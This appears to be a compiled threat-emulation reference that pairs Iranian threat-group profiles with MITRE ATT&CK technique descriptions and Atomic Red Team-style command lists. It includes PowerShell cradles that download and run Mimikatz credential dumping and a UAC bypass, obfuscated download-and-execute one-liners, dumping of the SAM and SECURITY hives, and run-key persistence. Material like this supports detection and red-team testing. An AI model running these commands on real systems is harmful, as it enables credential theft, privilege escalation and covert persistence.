PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)
```

## Technique Commands

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
$url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name 'atomic_user' -Password ATOM1CR3DT3@M -Description '#{description}'
New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
New-LocalUser -FullName 'Atomic Red Team' -Name '#{user_name}' -Password #{password} -Description 'Atomic Things'
powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -windowstyle hidden -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml');$Xml.command.a.execute | IEX"
"C:\Windows\system32\cmd.exe" /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct').Exec();close()"
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
powershell.exe -version 2 -Command Write-Host $PSVersion
Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand
excel.exe
cmd.exe
powershell.exe
excel.exe
powershell.exe
mshta.exe
cmd.exe
powershell.exe
mshta.exe
powershell.exe
powerpoint.exe
cmd.exe
powershell.exe
powerpoint.exe
powershell.exe
powershell.exe webClient.DownloadString(
powershell.exe webClient.DownloadFile
powershell.exe webClient.DownloadData
winword.exe
powershell.exe
hidden|-enc|-NonI\\Windows\\.+\\WindowsPowerShell\\.+\\powershell.exe
powershell/lateral_movement/invoke_psremoting
powershell/lateral_movement/invoke_psremoting
powershell/management/spawn
powershell/management/spawn
python/management/multi/spawn
python/management/multi/spawn
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Process Discovery

## Technique Description

```
Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

An example command that would obtain details on processes is "tasklist" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.

### Mac and Linux

In Mac and Linux, this is accomplished with the <code>ps</code> command.
```

## Technique Commands

```
tasklist /v [/svc]
net start
qprocess *
ps
shell tasklist /v [/svc]
shell net start
ps
post/windows/gather/enum_services
ps >> /tmp/loot.txt
ps aux >> /tmp/loot.txt
tasklist
powershell/situational_awareness/host/paranoia
powershell/situational_awareness/host/paranoia
powershell/situational_awareness/network/powerview/process_hunter
powershell/situational_awareness/network/powerview/process_hunter
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Process Discovery

## Technique Description

```
Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

An example command that would obtain details on processes is "tasklist" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.

### Mac and Linux

In Mac and Linux, this is accomplished with the <code>ps</code> command.
```

## Technique Commands

```
tasklist /v [/svc]
net start
qprocess *
ps
shell tasklist /v [/svc]
shell net start
ps
post/windows/gather/enum_services
ps >> /tmp/loot.txt
ps aux >> /tmp/loot.txt
tasklist
powershell/situational_awareness/host/paranoia
powershell/situational_awareness/host/paranoia
powershell/situational_awareness/network/powerview/process_hunter
powershell/situational_awareness/network/powerview/process_hunter
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Process Discovery

## Technique Description

```
Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

### Windows

An example command that would obtain details on processes is "tasklist" using the [Tasklist](https://attack.mitre.org/software/S0057) utility.

### Mac and Linux

In Mac and Linux, this is accomplished with the <code>ps</code> command.
```

## Technique Commands

```
tasklist /v [/svc]
net start
qprocess *
ps
shell tasklist /v [/svc]
shell net start
ps
post/windows/gather/enum_services
ps >> /tmp/loot.txt
ps aux >> /tmp/loot.txt
tasklist
powershell/situational_awareness/host/paranoia
powershell/situational_awareness/host/paranoia
powershell/situational_awareness/network/powerview/process_hunter
powershell/situational_awareness/network/powerview/process_hunter
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Query Registry

## Technique Description

```
Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

The Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
```

## Technique Commands

```
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
shell reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
reg queryval -k "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" -v fDenyTSConnections
post/windows/gather/enum_termserv
powershell.exe New-Item -ItemType Directory -Name ART1012 -Path $env:USERPROFILE\AppData\Local\Temp\
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg save HKLM\Security $env:USERPROFILE\AppData\Local\Temp\ART1012\security.hive"
reg save HKLM\System $env:USERPROFILE\AppData\Local\Temp\ART1012\system.hive"
reg save HKLM\SAM $env:USERPROFILE\AppData\Local\Temp\ART1012\sam.hive"
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
cmd.exe reg (query|add)
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
cmd.exe reg (query|add)
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
cmd.exe reg (query|add)
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
cmd.exe reg (query|add)
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
cmd.exe reg (query|add)
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
cmd.exe reg (query|add)
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
cmd.exe reg (query|add)
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
powershell/situational_awareness/network/powerview/get_cached_rdpconnection
powershell/situational_awareness/network/powerview/get_cached_rdpconnection
Dos
C: \ Users \ Administrator> reg query "HKEY_CURRENT_USER \ Software \ Microsoft \ Terminal Server Client \ Default" / ve
Error: The system can not find the specified registry key or value.
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Redundant Access

## Technique Description

```
Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. 

If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.

Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.
```

## Technique Commands

```
powershell/persistence/misc/skeleton_key
powershell/persistence/misc/skeleton_key
powershell/persistence/powerbreach/deaduser
powershell/persistence/powerbreach/deaduser
powershell/persistence/powerbreach/eventlog
powershell/persistence/powerbreach/eventlog
powershell/persistence/powerbreach/resolver
powershell/persistence/powerbreach/resolver
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Redundant Access

## Technique Description

```
Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. 

If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.

Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.
```

## Technique Commands

```
powershell/persistence/misc/skeleton_key
powershell/persistence/misc/skeleton_key
powershell/persistence/powerbreach/deaduser
powershell/persistence/powerbreach/deaduser
powershell/persistence/powerbreach/eventlog
powershell/persistence/powerbreach/eventlog
powershell/persistence/powerbreach/resolver
powershell/persistence/powerbreach/resolver
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Registry Run Keys / Startup Folder

## Technique Description

```
Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs.

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on.

By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.


Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.
```

## Technique Commands

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
\Microsoft\Windows\Start Menu\Programs\Startup|Software\Microsoft\Windows\CurrentVersion\Run|Software\Microsoft\Windows\CurrentVersion\RunOnce|Software\Microsoft\Windows\CurrentVersion\RunOnceEx|Software\Microsoft\Windows\CurrentVersion\RunServicesOnce|Software\Microsoft\Windows\CurrentVersion\RunServices|SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad|Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run|Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders|Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Microsoft\Windows\Start Menu\Programs\Startup
\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft\Windows\Start Menu\Programs\Startup
powershell/persistence/elevated/registry
powershell/persistence/elevated/registry
powershell/persistence/userland/registry
powershell/persistence/userland/registry
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Registry Run Keys / Startup Folder

## Technique Description

```
Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The following Registry keys can be used to set startup folder items for persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

